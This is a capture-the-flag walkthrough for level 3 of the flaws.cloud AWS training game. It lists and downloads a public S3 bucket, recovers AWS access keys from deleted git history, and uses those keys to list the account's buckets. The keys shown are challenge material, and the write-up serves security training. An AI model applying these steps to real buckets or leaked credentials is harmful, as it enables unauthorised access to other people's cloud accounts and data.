# [Level 3](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/)

* List bucket contents and notice a `.git` folder:

```bash
$ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --no-sign-request --region us-west-2
                           PRE .git/
2017-02-26 16:14:33     123637 authenticated_users.png
2017-02-26 16:14:34       1552 hint1.html
2017-02-26 16:14:34       1426 hint2.html
2017-02-26 16:14:35       1247 hint3.html
2017-02-26 16:14:33       1035 hint4.html
2017-02-26 18:05:16       1703 index.html
2017-02-26 16:14:33         26 robots.txt
```

* Download bucket contents:

```bash
$ mkdir dir && aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ dir --no-sign-request --region us-west-2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to .git/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to .git/COMMIT_EDITMSG
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to .git/config
# etc.
```

* Checkout the logs from the git repo:

```bash
$ cd dir && git log
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

* See what changed:

```bash
$ git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
diff --git a/access_keys.txt b/access_keys.txt
deleted file mode 100644
index e3ae6dd..0000000
--- a/access_keys.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-access_key AKIAJ366LIPB4IJKT7SA
-secret_access_key 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
```

* Use keys to list all s3 buckets:

```bash
aws configure --profile flaws
aws --profile flaws s3 ls
# 2017-02-26 10:49:31 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
```
